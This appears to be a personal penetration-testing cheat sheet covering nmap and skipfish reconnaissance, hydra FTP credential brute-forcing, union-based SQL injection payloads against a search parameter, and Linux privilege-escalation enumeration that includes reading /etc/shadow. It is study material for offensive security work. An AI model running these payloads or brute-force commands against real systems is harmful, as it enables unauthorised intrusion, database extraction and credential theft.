## nmap commands
- `nmap -sV -p <list of ports> <IP address>`: Lists all the services running on the ports

## hydra commands
- `hydra -C <username & password file> ftp://<IP address>`: Attempts to log in to the FTP service at the specified IP address using a list of username and password combinations provided in the file.

## skipfish commands
- `skipfish -o <Output file> <website url>`: Crawls the website to find all available directories
- `skipfish -o <Output file> -A <user>:<password> <website url>`: Crawls while logged in with HTML credentials

## SQL Injection
### SQL Injection in search fields
Lets say the search page is handled by a file named sql.php and the parameter is search.
Sql.php?search=pentesting  
First thing we try is to search with single quote '  
`Sql.php?search='`  
If it retruns an error, then we know its vulnerable.
Our next step is to determine the number of columns starting from running a normal query
on the search box to get an idea.  
Finding the number of columns:  
`Sql.php?search=test' order by 1-- -` [In the search field: `test' ORDER BY 1-- -`]  
or  
`Sql.php?search=test' order by 1--` [In the search field: `test' ORDER BY 1--`]  
We keep incrementing the number until we hit an error which indicates the number of columns.

Then we search for something similar to that below:  
`Sql.php?search=pentesting' union select 1,1,1,1,1,1#` [In the search field: `pentesting' UNION SELECT 1,1,1,1,1,1-- -`]  
or  
`Sql.php?search=pentesting' AND 1 = 0 UNION ALL SELECT 1,1,1,1,1,1 FROM information_schema.tables WHERE 1=0 OR 1=1-- `  
We continue adding '1's untill we don't receive any error from the page.
Only then we know how many columns by counting the '1's.

Then we try to find the database name, table names, columns of target table  
`Sql.php?search=pentesting' union select 1,database(),@@version,1,1,1#`  
or  
`Sql.php?search=pentesting' and 1 = 0 union all select 1,database(),@@version,1,1,1 from information_schema.tables where 1=0 OR 1=1-- -`  

`Sql.php?search=pentesting' union select 1,table_name,1,1,1,1 from information_schema.tables#` [In the search field: `pentesting' UNION SELECT 1,table_name,1,1 FROM information_schema.tables-- -`]

## Privilege escalation (Linux)
https://www.youtube.com/watch?v=ZTnwg3qCdVM
### System Enumeration
First get OS version, such that you can look for exploits of it and to be able to keep track of it  
`uname -a`  
Get info of the architecture, so you know vendor type, amount of cores and threads, etc. (good to know for some exploits)  
`lscpu`  
Check what services are running.  
`ps aux`  

### User Enumeration
To find out who we are, what permissions we have and what we are capable of doing.  
To check our username, what id´s everybody on the system has, and what sudo commands we can run, we use the following commands  
`whoami` `id` `sudo -l`  
We can check for other users  
`cat /etc/passwd | cut -d : -f 1`
We should look if we have access to any sensitive files, such as the shadow file
`cat /etc/shadow`  
Look at history is available, as in commands done by user  
`history`  

### Network Enumeration
To better understand the what our IP architecture is, what we're interacting with and what open ports may be available internally the might not be exposed externally.  
Check first out IP-address. We get information if it might be dual homed, communication with multiple networks. Then we'll get multiple IP-addresses. Check the "inet" address.  
`ifconfig` or `ip a`  
We can also use this command to check if the machine is communicating with another. We'll see our network first with the bits masked, next to it we can see our sourced adress ("src") which is our actually IP-address.
Then underneath we can see which address it's sourced through (Which is on of it's routes).  
`ip route`  
Another way to look at that too is with ARP tables. ARP tables will tell us who we're communicating with and maybe there's a machine that we're talking with kind of back and forth.  
`arp -a` or `ip neigh`  
Lastly we want to identify the ports what ports are open as well as what Communications exist. If there are machines communicating with the machine we're on we might be able to find an exploit.
We want to check if maybe any port is open only for the localhost ("127.0.0.1"), since then it won't be open externally.  
`netstat -ano`
